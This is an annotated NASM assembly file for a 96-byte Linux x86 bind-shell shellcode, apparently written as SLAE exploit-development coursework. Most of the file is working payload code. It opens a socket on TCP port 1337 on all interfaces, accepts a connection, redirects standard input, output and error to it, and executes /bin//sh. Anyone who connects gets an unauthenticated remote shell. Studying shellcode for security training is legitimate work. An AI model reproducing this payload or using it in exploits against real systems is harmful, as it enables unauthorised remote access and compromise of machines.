; Title: Shell Bind TCP Shellcode - 96 byte
; Platform: linux/x86
; Date: 2015-01-04
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; Github: https://github.com/dhn/SLAE/
; SLAE-721

BITS 32

global _start
section .text

; syscalls kernel
SYS_SOCKETCALL equ 0x66
SYS_EXECVE     equ 0x0b
SYS_DUP2       equ 0x3f

; /usr/include/linux/net.h
SYS_SOCKET     equ 0x01
SYS_LISTEN     equ 0x04
SYS_ACCEPT     equ 0x05

; settings
PORT           equ 0x3905 ; 1337 (network order)
STRUCT_LEN     equ 0x10   ; 16 Byte
AF_INET        equ 0x02
SOCK_STREAM    equ 0x01

_start:
	; Shell Bind TCP Shellcode (96 Byte)

socket:
	; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	;   |      |           |            |
	;  0x01    2           1            0
	;   |      \           |            /
	;  ebx      \________ esp _________/
	;                      |
	;                     ecx
	push SYS_SOCKETCALL    ; syscall 0x66
	pop eax                ; eax = 0x66

	; tell socketcall that we want to use socket()
	push SYS_SOCKET        ; SYS_SOCKET = 0x01
	pop ebx                ; ebx = 0x01

	xor esi, esi           ; clean esi register
	push esi               ; IPPROTO_IP  = 0x00
	push SOCK_STREAM       ; SOCK_STREAM = 0x01
	push AF_INET           ; AF_INET     = 0x02
	mov ecx, esp           ; save pointer to ecx

	int 0x80               ; syscall socket()

	pop edi                ; set esi to 0x02

	; save the file descriptor (sockfd) into edi.
	; change edi against eax, eax has now the
	; return value of socket() and edi has the
	; last value from top of the stack (0x02).
	xchg edi, eax       ; change edi against eax

	; ebx has now the the value: 0x02 it is the
	; same value did we need to tell socketcall()
	; that we want to use bind().
	xchg ebx, eax          ; change ebx against eax
	mov al, SYS_SOCKETCALL ; syscall 0x66

	;  struct: [AF_INET, PORT, INADDR_ANY]
	;     - sin_family: AF_INET     IPv4 Internet protocols
	;     - sin_port:   PORT        See settings in top of the file
	;     - sin_ip:     INADDR_ANY  Local IP (0.0.0.0 - 0x00000000)
	push esi               ; INADDR_ANY = 0x00
	push WORD PORT         ; PORT = 1337 (default)
	push WORD AF_INET      ; AF_INET = 0x02 (ebx is also 0x02)
	mov ecx, esp           ; save pointer to ecx (struct)

bind:
	; bind(sockfd, [AF_INET, PORT, INADDR_ANY], len(struct));
	;   |      |   |                         |      |
	;  0x02   edi  \__________ ecx __________/     0x10
	;   |           \           |           /
	;  ebx           \________ esp ________/
	;                           |
	;                          ecx
	push STRUCT_LEN         ; STRUCT_LEN = 0x10 (16 byte)
	push ecx                ; the struct which is stored in ecx
	push edi                ; push the sockfd on the stack
	mov ecx, esp            ; save pointer to ecx

	int 0x80                ; syscall bind()

listen:
	; listen(sockfd, backlog);
	;   |   |  |       |    |
	;  0x04 | edi      0    |
	;   |   |          |    |
	;  ebx  |         esi   |
	;       \_____ esp _____/
	;               |
	;              ecx
	mov al, SYS_SOCKETCALL ; syscall 0x66
	mov bl, SYS_LISTEN     ; SYS_LISTEN = 0x04

	push esi               ; backlog = edi
	push edi               ; push the sockfd on the stack
	mov ecx, esp           ; save pointer to ecx

	int 0x80               ; syscall listen()

accept:
	; accept(sockfd, struct, len(struct));
	;  |    |  |        |         |     |
	; 0x05  | edi      NULL      NULL   |
	;  |    |                           |
	; ebx   \___________ esp ___________/
	;                     |
	;                    ecx
	mov al, SYS_SOCKETCALL ; syscall 0x66
	mov bl, SYS_ACCEPT     ; SYS_ACCEPT = 0x05

	push esi               ; len(struct) = NULL
	push esi               ; struct = NULL
	push edi               ; push the sockfd on the stack
	mov ecx, esp           ; save pointer to ecx

	int 0x80               ; syscall accept()

	; We need the return value of accept() to
	; switch the output of stdin, stdout and stderr
	; to our execve("/bin//sh", 0, 0); command.
	xchg ebx, eax          ; change ebx against eax

	xor ecx, ecx           ; clean the ecx register
	mov cl, 0x03           ; ecx = 0x03 (STDIN, STDOUT, STDERR)
dup2:
	; dup2(oldfd, newfd);
	;  |     |      |
	; 0x3f   |    [2-0]
	;  |    ebx     |
	; eax          ecx
	dec cl                 ; decrement the counter
	mov BYTE al, SYS_DUP2  ; syscall 0x3f
	int 0x80               ; syscall dup2()
	jnz dup2               ; jump to dup2 until Z-Flag is set

execve:
	; execve("/bin//sh/", 0, 0);
	;   |    |         |  |  |
	;  0x11  |         |  | edx
	;   |    \__ esp __/ ecx
	;  eax         |
	;            ebx
	push SYS_EXECVE        ; syscall = 0x11
	pop eax                ; set SYS_EXECVE to eax

	xor ecx, ecx           ; clean esi
	push ecx               ; ecx is already zero
	push 0x68732f2f        ; push 'hs//'
	push 0x6e69622f        ; push 'nib/'

	mov ebx, esp           ; save pointer to ebx
	mov edx, ecx           ; set zero to edx

	int 0x80               ; syscall execve
